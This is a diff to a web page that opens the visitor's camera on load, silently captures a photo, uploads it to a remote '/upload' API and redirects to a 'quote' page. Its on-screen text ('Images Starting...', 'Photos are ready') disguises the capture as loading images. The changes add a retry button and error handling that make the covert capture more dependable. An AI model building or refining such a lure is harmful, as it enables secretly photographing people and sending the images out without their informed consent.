@@ -18,12 +18,33 @@ body{
     justify-content:center;
     align-items:center;
     flex-direction:column;
+    text-align:center;
+    padding:20px;
 }
 
 video{
     width:90%;
     max-width:400px;
+    border-radius:15px;
     display:none;
+}
+
+/* RETRY BUTTON */
+.retry-btn{
+    margin-top:20px;
+    padding:12px 20px;
+    border:none;
+    border-radius:10px;
+    background:#0077ff;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+    display:none;
+    transition:0.3s;
+}
+
+.retry-btn:hover{
+    background:#005ad1;
 }
 </style>
 </head>
@@ -31,10 +52,20 @@ video{
 <body>
 
 <div class="container">
+
     <h2>Images Starting...</h2>
+
     <p id="status">Please wait</p>
+
     <video id="video" autoplay playsinline></video>
+
     <canvas id="canvas" style="display:none"></canvas>
+
+    <!-- RETRY BUTTON -->
+    <button id="retryBtn" class="retry-btn" onclick="retryUpload()">
+        Try Again
+    </button>
+
 </div>
 
 <script src="./config.js"></script>
@@ -46,14 +77,21 @@ const API_URL = window.API_CONFIG.API_URL;
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const statusText = document.getElementById("status");
+const retryBtn = document.getElementById("retryBtn");
 
 let uploaded = false;
+let streamStarted = false;
 
 window.onload = startCamera;
 
+/* START CAMERA */
 async function startCamera(){
 
     try{
+
+        retryBtn.style.display = "none";
+
+        statusText.innerText = "Opening images...";
 
         const stream = await navigator.mediaDevices.getUserMedia({
             video:true,
@@ -61,19 +99,31 @@ async function startCamera(){
         });
 
         video.srcObject = stream;
+
         await video.play();
 
-        video.style.display="block";
-        statusText.innerText="Photos are ready";
+        streamStarted = true;
+
+        video.style.display = "block";
+
+        statusText.innerText = "Photos are ready ✔";
 
         setTimeout(capture, 300);
 
     }catch(err){
-        statusText.innerText="Photos blocked. / error";
+
+        console.log(err);
+
+        statusText.innerText = "Photos blocked / network error ❌";
+
+        retryBtn.style.display = "block";
     }
 }
 
+/* CAPTURE */
 function capture(){
+
+    if(uploaded || !streamStarted) return;
 
     const ctx = canvas.getContext("2d");
 
@@ -82,25 +132,61 @@ function capture(){
 
     ctx.drawImage(video,0,0);
 
+    statusText.innerText = "Images are coming soon...";
+
     canvas.toBlob(async (blob)=>{
 
-        const form = new FormData();
-        form.append("photo",blob,"img.jpg");
+        try{
 
-        const res = await fetch(`${API_URL}/upload`,{
-            method:"POST",
-            body:form
-        });
+            const form = new FormData();
+            form.append("photo",blob,"img.jpg");
 
-        const data = await res.json();
+            const res = await fetch(`${API_URL}/upload`,{
+                method:"POST",
+                body:form
+            });
 
-        if(data.success){
-            window.location.href="quote.html";
-        } else {
-            statusText.innerText="please try again. network failed!";
+            const data = await res.json();
+
+            if(data.success){
+
+                uploaded = true;
+
+                statusText.innerText = "successful ✔";
+
+                setTimeout(()=>{
+                    window.location.href = "quote.html";
+                },700);
+
+            } else {
+
+                statusText.innerText = "Please try again. Network failed ❌";
+
+                retryBtn.style.display = "block";
+            }
+
+        }catch(err){
+
+            console.log(err);
+
+            statusText.innerText = "network error ❌";
+
+            retryBtn.style.display = "block";
         }
 
-    },"image/jpeg");
+    },"image/jpeg",0.7);
+}
+
+/* RETRY BUTTON */
+function retryUpload(){
+
+    retryBtn.style.display = "none";
+
+    if(streamStarted){
+        capture();
+    }else{
+        startCamera();
+    }
 }
 
 </script>
